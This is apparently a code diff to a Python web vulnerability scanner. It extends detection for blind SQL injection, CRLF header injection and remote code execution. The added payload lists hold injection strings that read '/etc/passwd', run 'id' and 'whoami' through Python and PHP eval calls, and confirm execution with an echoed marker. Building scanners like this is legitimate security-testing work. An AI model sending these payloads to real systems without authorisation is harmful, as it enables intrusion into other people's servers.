@@ -241,6 +241,23 @@ async def test_sqli(
                     "confidence": "medium",
                 }
 
+            # Content-based comparison — different content even if similar size
+            if true_body != false_body and true_body != baseline_body:
+                # Use simple hash comparison
+                true_hash = hashlib.md5(true_body.encode()).hexdigest()[:8]
+                false_hash = hashlib.md5(false_body.encode()).hexdigest()[:8]
+                baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()[:8]
+                if true_hash != false_hash and true_hash != baseline_hash:
+                    return {
+                        "vulnerable": True,
+                        "url": true_url,
+                        "param": param,
+                        "technique": "boolean-blind",
+                        "payload": f"{original_value} OR 1=1 vs {original_value} AND 1=2",
+                        "evidence": f"Content differs: true={true_hash}, false={false_hash}, baseline={baseline_hash}",
+                        "confidence": "medium",
+                    }
+
         # Phase 4: Time-based blind SQLi
         time_payloads = [
             (f"{original_value}' AND SLEEP(3)-- -", 3),
@@ -611,6 +628,30 @@ async def test_crlf(
                     "vulnerable": True,
                     "payload": payload,
                     "injected_header": f"X-Injected: {headers.get('x-injected', '')}",
+                    "param": param,
+                    "url": test_url,
+                }
+
+        # Also try replacing the value entirely (for params that set headers directly)
+        for payload in _CRLF_PAYLOADS:
+            test_url = _replace_param(target_url, param, payload)
+            status, body, headers = await _send(session, test_url)
+            if status == 0:
+                continue
+            if "x-injected" in headers:
+                return {
+                    "vulnerable": True,
+                    "payload": payload,
+                    "injected_header": f"X-Injected: {headers.get('x-injected', '')}",
+                    "param": param,
+                    "url": test_url,
+                }
+            # Also check for Set-Cookie injection
+            if "bughound=1" in headers.get("set-cookie", ""):
+                return {
+                    "vulnerable": True,
+                    "payload": payload,
+                    "injected_header": f"Set-Cookie injection: {headers.get('set-cookie', '')}",
                     "param": param,
                     "url": test_url,
                 }
@@ -1476,6 +1517,18 @@ _RCE_OUTPUT_PAYLOADS = [
     # Null byte + command
     "%00|id",
     "%00;id",
+    # Direct command replacement (for params like ?cmd=X where X IS the command)
+    "id",
+    "cat /etc/passwd",
+    "whoami",
+    # Python eval/exec injection
+    "__import__('os').popen('id').read()",
+    "__import__('os').popen('cat /etc/passwd').read()",
+    "eval('__import__(\"os\").popen(\"id\").read()')",
+    # PHP code injection
+    "system('id')",
+    "passthru('id')",
+    "exec('id')",
 ]
 
 _RCE_OUTPUT_PAYLOADS_WINDOWS = [
@@ -1560,6 +1613,26 @@ async def test_rce(
                     })
                     return result
 
+            # Direct time-based — for params where value IS the command
+            for direct_time in ["sleep 5", "sleep+5", "ping -c 5 127.0.0.1"]:
+                test_url = _replace_param(target_url, param, direct_time)
+                t_start = time.monotonic()
+                status, body, _ = await _send(session, test_url)
+                elapsed = time.monotonic() - t_start
+                if status == 0:
+                    continue
+                if elapsed > baseline_time + 4:
+                    result.update({
+                        "vulnerable": True,
+                        "technique": "time-based-direct",
+                        "payload": direct_time,
+                        "delay_seconds": round(elapsed, 2),
+                        "evidence": f"Direct command: response delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
+                        "os": "linux",
+                        "url": test_url,
+                    })
+                    return result
+
             # Output-based Linux payloads
             baseline_has_linux = _RCE_OUTPUT_INDICATORS.search(baseline_body)
             for payload in _RCE_OUTPUT_PAYLOADS:
@@ -1606,6 +1679,43 @@ async def test_rce(
                         "url": test_url,
                     })
                     return result
+
+            # Direct replacement — for params where the value IS the command
+            # (e.g., ?cmd=id, ?code=eval_expr, ?exec=command)
+            _RCE_DIRECT_PAYLOADS = [
+                "id",
+                "cat /etc/passwd",
+                "whoami",
+                "__import__('os').popen('id').read()",
+                "__import__('os').popen('cat /etc/passwd').read()",
+                "system('id')",
+            ]
+            for payload in _RCE_DIRECT_PAYLOADS:
+                test_url = _replace_param(target_url, param, payload)
+                status, body, _ = await _send(session, test_url)
+
+                if status == 0:
+                    continue
+
+                match = _RCE_OUTPUT_INDICATORS.search(body)
+                if match and not baseline_has_linux:
+                    # Confirm with unique marker
+                    marker = f"BUGHOUND_RCE_{uuid.uuid4().hex[:8]}"
+                    confirm_url = _replace_param(target_url, param, f"echo {marker}")
+                    _, confirm_body, _ = await _send(session, confirm_url)
+                    if marker in confirm_body:
+                        start = max(0, match.start() - 50)
+                        end = min(len(body), match.end() + 100)
+                        evidence_ctx = body[start:end].strip()
+                        result.update({
+                            "vulnerable": True,
+                            "technique": "direct-command",
+                            "payload": payload,
+                            "evidence": f"Direct command execution (confirmed via unique marker): ...{evidence_ctx}...",
+                            "os": "linux",
+                            "url": test_url,
+                        })
+                        return result
 
             # Output-based Windows payloads
             baseline_has_win = _RCE_WINDOWS_INDICATORS.search(baseline_body)
